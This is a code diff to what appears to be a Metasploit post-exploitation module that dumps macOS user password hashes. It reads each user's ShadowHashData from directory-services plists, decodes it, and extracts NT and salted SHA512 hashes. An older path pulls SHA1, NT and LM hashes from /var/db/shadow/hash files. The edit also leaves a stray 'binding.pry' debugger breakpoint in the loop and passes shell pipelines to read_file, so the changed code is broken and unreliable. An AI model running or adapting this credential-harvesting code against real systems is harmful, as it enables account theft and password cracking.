@@ -103,7 +103,7 @@ class Metasploit3 < Msf::Post
     sha1_file = ""
 
     # Check if system is Lion if not continue
-    if ver_num =~ /10\.(7)/
+    if ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
 
       hash_decoded = ""
 
@@ -117,27 +117,26 @@ class Metasploit3 < Msf::Post
           next if p =~ /^daemon|root|nobody/
 
           # Turn profile plist in to XML format
-          cmd_exec("cp","/private/var/db/dslocal/nodes/Default/users/#{p.chomp} /tmp/")
-          cmd_exec("plutil","-convert xml1 /tmp/#{p.chomp}")
-          file = cmd_exec("cat","/tmp/#{p.chomp}")
+          plist = "/private/var/db/dslocal/nodes/Default/users/#{p.chomp}"
+          data = cmd_exec("defaults read #{plist} ShadowHashData")
 
-          # Clean up using secure delete overwriting and zeroing blocks
-          cmd_exec("/usr/bin/srm","-m -z /tmp/#{p.chomp}")
-
-          # Process XML Plist into a usable hash
-          plist_values = read_ds_xml_plist(file)
+          if data.gsub(/\s+/, '') =~ /\(<(.+)>\)/
+            data = $1
+          else
+            next
+          end
 
           # Extract the shadow hash data, decode it and format it
-          plist_values['ShadowHashData'].join("").unpack('m')[0].each_byte do |b|
+          data.unpack('m')[0].each_byte do |b|
             hash_decoded << sprintf("%02X", b)
           end
-          user = plist_values['name'].join("")
+          user = File.basename(p, '.*')
 
           # Check if NT HASH is present
           if hash_decoded =~ /4F1010/
             nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0]
           end
-
+          require 'pry'; binding.pry
           # Carve out the SHA512 Hash, the first 4 bytes is the salt
           sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
 
@@ -189,9 +188,9 @@ class Metasploit3 < Msf::Post
       end
 
       # Extract the hashes
-      sha1_hash = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
-      nt_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
-      lm_hash   = cmd_exec("/bin/cat", "/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
+      sha1_hash = read_file("/var/db/shadow/hash/#{guid}  | cut -c169-216").chomp
+      nt_hash   = read_file("/var/db/shadow/hash/#{guid}  | cut -c1-32").chomp
+      lm_hash   = read_file("/var/db/shadow/hash/#{guid}  | cut -c33-64").chomp
 
       # Check that we have the hashes and save them
       if sha1_hash !~ /00000000000000000000000000000000/
